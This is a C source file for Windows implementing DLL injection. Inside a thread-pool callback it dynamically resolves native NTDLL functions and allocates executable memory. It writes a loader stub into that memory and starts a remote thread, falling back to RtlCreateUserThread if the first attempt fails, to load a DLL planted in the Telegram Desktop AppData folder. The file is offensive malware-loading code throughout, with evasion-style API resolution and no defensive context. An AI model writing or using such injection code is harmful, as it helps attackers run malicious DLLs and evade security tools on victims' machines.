#include <windows.h>
#include <tchar.h>
#include <stdio.h>
#include "Header.h"

// Shellcode that will run in the remote process
DWORD WINAPI RemoteThread(PINJECTION_PARAMS pParams) {
    HMODULE(WINAPI * _LoadLibraryA)(LPCSTR) = (HMODULE(WINAPI*)(LPCSTR))pParams->pLoadLibraryA;
    FARPROC(WINAPI * _GetProcAddress)(HMODULE, LPCSTR) = (FARPROC(WINAPI*)(HMODULE, LPCSTR))pParams->pGetProcAddress;

    _LoadLibraryA(pParams->DllPath);
    return 0;
}

// Thread pool work callback that performs the injection
VOID CALLBACK InjectionWorkCallback(
    PTP_CALLBACK_INSTANCE Instance,
    PVOID Parameter,
    PTP_WORK Work
) {
    UNREFERENCED_PARAMETER(Instance);
    UNREFERENCED_PARAMETER(Work);

    PINJECTION_PARAMS pParams = (PINJECTION_PARAMS)Parameter;
    HMODULE hNtdll = NULL;
    _NtAllocateVirtualMemory pNtAllocateVirtualMemory = NULL;
    _NtWriteVirtualMemory pNtWriteVirtualMemory = NULL;
    _NtCreateThreadEx pNtCreateThreadEx = NULL;
    _NtOpenProcess pNtOpenProcess = NULL;
    _RtlCreateUserThread pRtlCreateUserThread = NULL;
    HANDLE hProcess = NULL;
    PVOID pRemoteMem = NULL;
    SIZE_T regionSize = sizeof(INJECTION_PARAMS);
    CLIENT_ID clientId = { 0 };
    OBJECT_ATTRIBUTES oa = { 0 };

    // Get target PID (for demo purposes, we'll use current process)
    DWORD targetPid = GetCurrentProcessId();

    // Dynamically resolve NTDLL functions
    hNtdll = GetModuleHandle(L"ntdll.dll");
    if (!hNtdll) {
        _tprintf(_T("Failed to get ntdll handle\n"));
        return;
    }

    pNtAllocateVirtualMemory = (_NtAllocateVirtualMemory)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
    pNtWriteVirtualMemory = (_NtWriteVirtualMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
    pNtCreateThreadEx = (_NtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");
    pNtOpenProcess = (_NtOpenProcess)GetProcAddress(hNtdll, "NtOpenProcess");
    pRtlCreateUserThread = (_RtlCreateUserThread)GetProcAddress(hNtdll, "RtlCreateUserThread");

    if (!pNtAllocateVirtualMemory || !pNtWriteVirtualMemory || !pNtCreateThreadEx || !pNtOpenProcess || !pRtlCreateUserThread) {
        _tprintf(_T("Failed to resolve NTDLL functions\n"));
        return;
    }

    // Open target process
    clientId.UniqueProcess = (HANDLE)targetPid;
    NTSTATUS status = pNtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &oa, &clientId);
    if (!NT_SUCCESS(status)) {
        _tprintf(_T("NtOpenProcess failed: 0x%X\n"), status);
        return;
    }

    // Allocate memory in target process
    status = pNtAllocateVirtualMemory(hProcess, &pRemoteMem, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!NT_SUCCESS(status)) {
        _tprintf(_T("NtAllocateVirtualMemory failed: 0x%X\n"), status);
        CloseHandle(hProcess);
        return;
    }

    // Write injection parameters to target process
    status = pNtWriteVirtualMemory(hProcess, pRemoteMem, pParams, sizeof(INJECTION_PARAMS), NULL);
    if (!NT_SUCCESS(status)) {
        _tprintf(_T("NtWriteVirtualMemory failed: 0x%X\n"), status);
        CloseHandle(hProcess);
        return;
    }

    // Allocate memory for the thread function
    regionSize = 0x1000;
    PVOID pRemoteThread = NULL;
    status = pNtAllocateVirtualMemory(hProcess, &pRemoteThread, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!NT_SUCCESS(status)) {
        _tprintf(_T("NtAllocateVirtualMemory for thread failed: 0x%X\n"), status);
        CloseHandle(hProcess);
        return;
    }

    // Write thread function to target process
    status = pNtWriteVirtualMemory(hProcess, pRemoteThread, RemoteThread, 0x1000, NULL);
    if (!NT_SUCCESS(status)) {
        _tprintf(_T("NtWriteVirtualMemory for thread failed: 0x%X\n"), status);
        CloseHandle(hProcess);
        return;
    }

    // Create remote thread using NtCreateThreadEx
    HANDLE hThread = NULL;
    status = pNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, pRemoteThread, pRemoteMem, 0, 0, 0, 0, NULL);
    if (!NT_SUCCESS(status)) {
        // Fall back to RtlCreateUserThread if NtCreateThreadEx fails
        status = pRtlCreateUserThread(hProcess, NULL, FALSE, 0, NULL, NULL, pRemoteThread, pRemoteMem, &hThread, NULL);
        if (!NT_SUCCESS(status)) {
            _tprintf(_T("Thread creation failed: 0x%X\n"), status);
            CloseHandle(hProcess);
            return;
        }
    }

    _tprintf(_T("Injection successful!\n"));
    CloseHandle(hThread);
    CloseHandle(hProcess);
}

int main() {
    PTP_POOL pool = NULL;
    PTP_WORK work = NULL;
    TP_CALLBACK_ENVIRON CallBackEnviron;
    INJECTION_PARAMS params = { 0 };

    // Set up injection parameters
    params.pLoadLibraryA = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryA");
    params.pGetProcAddress = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "GetProcAddress");
    strcpy_s(params.DllPath, MAX_PATH, "C:\\Users\\user\\AppData\\Roaming\\Telegram Desktop\\AVRT.dll"); // Replace with your DLL path

    // Initialize thread pool environment
    InitializeThreadpoolEnvironment(&CallBackEnviron);

    // Create thread pool
    pool = CreateThreadpool(NULL);
    if (!pool) {
        _tprintf(_T("CreateThreadpool failed\n"));
        return 1;
    }

    SetThreadpoolThreadMaximum(pool, 1);
    SetThreadpoolThreadMinimum(pool, 1);

    // Associate pool with callback environment
    SetThreadpoolCallbackPool(&CallBackEnviron, pool);

    // Create work item
    work = CreateThreadpoolWork(InjectionWorkCallback, &params, &CallBackEnviron);
    if (!work) {
        _tprintf(_T("CreateThreadpoolWork failed\n"));
        CloseThreadpool(pool);
        return 1;
    }

    // Submit work to thread pool
    SubmitThreadpoolWork(work);

    // Wait for the work to complete
    WaitForThreadpoolWorkCallbacks(work, FALSE);

    // Cleanup
    CloseThreadpoolWork(work);
    CloseThreadpool(pool);

    return 0;
}